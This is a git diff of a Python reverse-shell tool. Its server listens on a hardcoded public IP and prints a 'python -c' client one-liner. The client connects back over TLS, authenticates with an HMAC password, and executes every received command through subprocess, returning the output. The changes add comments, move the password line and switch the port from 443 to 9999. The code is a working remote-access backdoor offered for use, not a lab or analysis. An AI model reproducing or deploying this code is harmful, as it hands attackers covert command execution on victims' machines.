@@ -102,23 +102,24 @@ def c_client_code(ip, port, password):
     client_code = f"""
 import socket, ssl, subprocess, hmac, hashlib
 CERT=\"\"\"{auth_key}\"\"\" 
-PASSWORD = b"{password}"
-def connect():
+
+def connect(): 
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     context.load_verify_locations(cadata=CERT)
     try:
         with socket.create_connection(("{ip}", {port})) as sock:
             with context.wrap_socket(sock, server_hostname="{ip}") as ssock:
+                PASSWORD = b"{password}"
                 # Authentication phase
                 nonce = ssock.recv(16)
                 hmac_res = hmac.new(PASSWORD, nonce, hashlib.sha256).digest()
-                ssock.send(hmac_res)
-                auth_status = ssock.recv(12)
+                ssock.send(hmac_res) # sends to the server
+                auth_status = ssock.recv(12)   #Authentication verification
                 if auth_status != b"AUTH_SUCCESS":
                     raise Exception("Authentication failed")
                 # Command loop
                 while True:
-                    cmd = ssock.recv(8192).decode()
+                    cmd = ssock.recv(8192).decode() #Reads data from the secure (SSL) connection established with the server.
                     if cmd.lower() == "exit":
                         break
                     output = subprocess.getoutput(cmd)
@@ -170,21 +171,32 @@ def start_server(ip, port, password):
     """
     Start server with authentication
     """
+    # Generate RSA keys and certificate 
     cert, key = keys__check(ip, password)
     
+    # Create an SSL context 
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    # Load the generated certificate and private key into the SSL context
     context.load_cert_chain(certfile=cert, keyfile=key)
     
+    # Create a socket 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        # Bind the socket 
         sock.bind((ip, port))
+        # Start listening for incoming connections
         sock.listen(5)
         print(f"[*] Listening on {ip}:{port}")
         
+        # Wrap the socket with SSL/TLS 
         with context.wrap_socket(sock, server_side=True) as ssock:
             while True:
+                # Accept an incoming connection from a client
                 client, addr = ssock.accept()
+                # Print the address of the client that has connected
                 print(f"[+] Connection from {addr}")
+                # Handle the client, passing the socket and password for authentication
                 handle_client(client, password)
+
 
 
 def keys__check(ip_add, password):
@@ -203,7 +215,7 @@ def keys__check(ip_add, password):
     certificate_path = generate_certificate(private_key_path, ip_add)
     
     # Generate client code with password for the client to use
-    client_code = c_client_code(ip_add, 443, password)
+    client_code = c_client_code(ip_add, 9999, password)
     print("\n[** Start Client Code **]")
     print(f"python -c \"{client_code}\"")
     print("[** end the Client Code **]\n")
@@ -211,6 +223,6 @@ def keys__check(ip_add, password):
     return certificate_path, private_key_path
 
 if __name__ == "__main__":
-    server_ip = "178.62.237.181"  # ← ضع ال IP هنا
+    server_ip = "178.62.237.181"  
     password = input("[!] Set authentication password: ").strip()
-    start_server(server_ip, 443, password)
+    start_server(server_ip, 9999, password)
